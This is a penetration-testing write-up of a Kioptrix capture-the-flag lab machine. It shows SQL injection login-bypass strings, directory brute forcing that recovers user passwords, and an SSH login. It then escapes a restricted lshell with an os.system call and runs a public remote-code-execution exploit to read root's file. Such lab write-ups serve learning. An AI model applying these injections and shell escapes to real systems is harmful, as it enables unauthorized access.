Among the reported vulnerabilities, of some relevance are:

`Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch`

`The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS`

`Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.`

`Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
`
`Cookie PHPSESSID created without the httponly flag`

So let's try to access the web server on port 80:

`http://http://192.168.1.32/`

It is asking for a user and password.

F12 on he browser and we see that there is a form posting to a php file:

`<form name="form1" method="post" action="checklogin.php"></form>`

so it is a PHP application.

Let's then try:

` ' or 1-- `

actually it is mysql database from the error message.


So let's user our pastpartout for MySQL:

`' or '1'='1`

actually the output is escaped so there may be some protection there.

`http://192.168.1.32/member.php?username=\%27%20or%20\%271\%27=\%271`

In fact the output is:

```
User \' or \'1\'=\'1

Oups, something went wrong with your member's page account.
Please contact your local Administrator
to fix the issue.
```

So if I change now the field username to my name:

`http://192.168.1.32/member.php?username=Max`

my name is displayed on the page... 

http://192.168.1.32/member.php?username=john

correlated with an error message. So I guess if I spot a name that is correct, then I may get a valid response, always providing as password:

`' or '1'='1`

So remembering the previous Kioptrix (1.2) a user was john, I give a try, and voilá, the user is actually john. I recognise though that is just a lucky guess and we need to proceed with a more methodological approach.

So let's try to find out the list of directories on that website:

`dirbuster -u http://192.168.1.32`

We found out that there are two folders with name:

* john
* robert

and in fact we can see the password for the users, once logged in:

john: MyNameIsJohn

Interestingly, logging as robert I get back john's page and password...


So let's try to see if such a user and password can be used to get a shell:

`ssh john@192.168.1.32`

and yes we are in... so this is really a didactical box, I think this will never happen ireal life... but I notice we have a restricted shell...

`john:~$ cd ..
*** forbidden path -> "/home/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
`
I followed the cheatsheet: 

`https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/`

`https://www.metahackers.pro/breakout-of-restricted-shell/`

`http://www.hackingmonks.net/2019/07/escaping-restricted-linux-shells-like.html`

but nothing worked for me...

I should try:
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf 

but not for now.

`searchsploit openssh 4.7
Exploits: No Result
Shellcodes: No Result`

Nothing really interesting about:

`searchsploit apache 2.2`

Nothing interesting...

going back to the restricted shell, I just learned that I can get the list of the allowed commands by typing:

`john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
`
`
john:~$ echo $SHELL
*** forbidden path -> "/bin/kshell"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
`
So let's go to see which shell implements the commands:
* ll
* lpath 

as they are not common commands.

We find out taht it is from:

`https://sourceforge.net/p/lshell/wiki/Home/`

I also tried randomly the command:

`sudo`

and I got back the below error:ß

```
john:~$ sudo
Traceback (most recent call last):
  File "/bin/kshell", line 27, in <module>
    lshell.main()
  File "/usr/lib/python2.5/site-packages/lshell.py", line 1219, in main
    cli.cmdloop()
```

So definitely this is the lshell...

Let's go to see if there are associated vulnerabilities for that...

So I googled:

`lshell how to bypass`

and I get two interesting links:

* https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/

I tried all of the suggestions but they did not really work.

So I try the second link:

* https://www.aldeid.com/wiki/Lshell

There there is not indication of a shell version so not sure it is useful but the suggested line is short so I give a try:

`echo os.system('/bin/bash')`

and actually it works... so I have full shell unrestricted capabilities... but I am not really satisfied, as not having a version of lshell to associate with the found vulnerability makes everything a bit too much heuristic, or well too much lucky that is not the case to rely on for a methodological approach...
Said that I go to searchsploit and I look for something related to lshell there:

`searchsploit lshell`

and we get back:

`LShell 0.9.15 - Remote Code Execution                                                            | exploits/linux/remote/39632.py`

I try to run it but the script complains that I miss a library called: **paramiko**
To fix this I run the command:

`pip install paramiko`

I try to rerun the command but it complains about sys.args so I add at the top the statement:

`import sys`

Now all looks correct and I am rady to issue:

`python 39632.py john MyNameIsJohn 192.168.1.32 22`

and it produces:

```console
[!] .............................
[!] lshell <= 0.9.15 remote shell.
[!] note: you can also ssh in and execute '/bin/bash'
[!] .............................
[!] Checking host 192.168.1.32...
[+] vulnerable lshell found, preparing pseudo-shell...
```

Since it is a pseudoshell, the functionaity is not really friendly.

I could not really obtain a full tty but even if constrained by the shell hanging here and there, I had been able to spot:

`$ ls -ltr /root
total 8
drwxr-xr-x 8 loneferret loneferret 4096 2012-02-04 17:01 lshell-0.9.12
-rw-r--r-- 1 root       root        625 2012-02-06 10:48 congrats.txt
`
Issuing the command:

`less /root/congrats.txt`

```color
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret
```

But I did not really got root so I'm missing the privilege escalation step...
